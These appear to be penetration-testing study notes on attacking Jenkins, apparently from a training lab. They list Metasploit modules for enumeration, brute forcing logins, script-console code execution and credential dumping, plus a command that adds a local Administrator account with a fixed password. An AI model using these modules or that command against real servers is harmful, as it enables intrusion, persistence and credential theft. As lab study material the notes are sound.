
- Often installed on Windows servers running as the all-powerful SYSTEM account
- Jenkins runs on Tomcat port 8080 by default.
- Utilizes port 5000 to attach slave servers

==Enumeration==

- `msf> use auxiliary/scanner/http/jenkins_enum`
- Command without auth: `msf> use auxiliary/scanner/http/jenkins_command`

==**Brute Force**==

`msf> use auxiliary/scanner/http/jenkins_login`

We can fingerprint Jenkins quickly by the telltale login page.

==Attacking==

**Code Execution**

- http://jenkins.inlanefreight.local:8000/script

**Options**

- `exploit/multi/http/jenkins_script_console`
- Create a user: `net user john 'Password123!' /add && net localgroup Administrators john /add`

**Post**

Dump Creds:`msf> post/multi/gather/jenkins_gather`

**==Vulnerabilities==**

CVE-2018-1999002 and CVE-2019-1003000 to achieve pre-authenticated remote code execution, bypassing script security sandbox protection during script compilation.
